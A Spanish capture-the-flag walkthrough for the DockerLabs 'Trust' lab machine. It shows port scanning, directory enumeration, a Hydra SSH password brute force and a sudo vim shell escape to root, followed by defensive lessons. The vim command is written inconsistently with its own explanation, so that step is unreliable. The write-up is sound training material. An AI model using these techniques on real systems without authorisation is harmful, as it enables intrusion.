# Trust — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🔵 Muy Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 02/04/2024  
**Técnicas:** Nmap · Gobuster · Hydra · SSH · Privesc (vim/sudo)

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web](#2-enumeración-web)
3. [Acceso inicial — Fuerza bruta SSH](#3-acceso-inicial--fuerza-bruta-ssh)
4. [Escalada de privilegios](#4-escalada-de-privilegios)
5. [Lección aprendida](#5-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina y obtenemos su IP:

```bash
sudo bash auto_deploy.sh trust.tar
```

> La IP asignada es `172.18.0.2`. Comprobamos conectividad:

```bash
ping -c 3 172.18.0.2
```

```
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.125 ms
64 bytes from 172.18.0.2: icmp_seq=2 ttl=64 time=0.112 ms
64 bytes from 172.18.0.2: icmp_seq=3 ttl=64 time=0.045 ms
```

Hacemos un primer escaneo rápido para ver puertos abiertos:

```bash
nmap -Pn 172.18.0.2
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ahora un escaneo más profundo especificando esos puertos para obtener versiones:

```bash
nmap -p22,80 -sCV 172.18.0.2
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
```

> 💡 **¿Por qué dos escaneos?** El primero es rápido y nos dice qué puertos hay abiertos. El segundo es más lento pero nos da las versiones exactas de cada servicio. Esta combinación es la más eficiente.

---

## 2. Enumeración web

Visitamos `http://172.18.0.2` y vemos la página por defecto de Apache — sin contenido relevante. Lanzamos Gobuster para buscar directorios y archivos ocultos:

```bash
sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.18.0.2/" -x php,.sh,py.txt
```

```
/secret.php   (Status: 200) [Size: 927]
```

> 💡 **¿Para qué sirve `-x`?** Le dice a Gobuster que pruebe también esas extensiones para cada palabra del diccionario. Así no solo busca directorios sino también archivos específicos como `.php` o `.txt`.

Visitamos `http://172.18.0.2/secret.php`:

```
Hola Mario,
Esta web no se puede hackear.
```

Tenemos un nombre de usuario: **mario**. Y sabemos que el puerto 22 (SSH) está abierto. Podemos intentar fuerza bruta.

---

## 3. Acceso inicial — Fuerza bruta SSH

Usamos Hydra para encontrar la contraseña de mario en SSH:

```bash
hydra -l mario -P ~/Descargas/rockyou.txt ssh://172.18.0.2
```

```
[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
```

> 💡 **¿Cómo funciona Hydra aquí?** `-l mario` fija el usuario. `-P rockyou.txt` prueba cada línea del diccionario como contraseña. `ssh://` le dice que el objetivo es SSH. Hydra prueba miles de combinaciones hasta encontrar la válida.

Contraseña encontrada: **chocolate**. Conectamos por SSH:

```bash
ssh mario@172.18.0.2
```

```
mario@172.18.0.2's password: chocolate
mario@ed4c736a4d5a:~$
```

✅ Estamos dentro como **mario**.

---

## 4. Escalada de privilegios

Comprobamos qué puede ejecutar mario con permisos de sudo:

```bash
mario@ed4c736a4d5a:~$ sudo -l
```

```
User mario may run the following commands on ed4c736a4d5a:
    (ALL) /usr/bin/vim
```

mario puede ejecutar **vim como root sin contraseña**. Buscamos en GTFObins cómo aprovechar esto:

```bash
mario@ed4c736a4d5a:~$ sudo vim -c ':/bin/sh'
```

```
# whoami
root
```

> 💡 **¿Qué hace este comando?** `sudo vim` lanza vim como root. El flag `-c ':/bin/sh'` le dice a vim que ejecute el comando `!/bin/sh` al arrancar, que lanza una shell. Como vim se ejecuta como root, la shell también es root.

✅ Somos **root**. Máquina comprometida.

---

## 5. Lección aprendida

Esta máquina encadena dos errores muy comunes en entornos reales:

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **Nombre de usuario en página web** | `/secret.php` | Enumeración de usuarios sin autenticación |
| **Contraseña débil en SSH** | Usuario mario | Fuerza bruta exitosa con rockyou.txt |
| **vim con permisos sudo sin restricción** | `/usr/bin/vim` | Escalada directa a root |

**Para defenderse:**
- Nunca exponer información de usuarios en páginas web accesibles.
- Usar contraseñas fuertes y únicas — "chocolate" aparece en cualquier diccionario.
- Si un usuario necesita sudo, restringirlo a comandos específicos con rutas absolutas Y asegurarse de que esos binarios no permiten escape de shell (GTFObins tiene una lista completa).

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
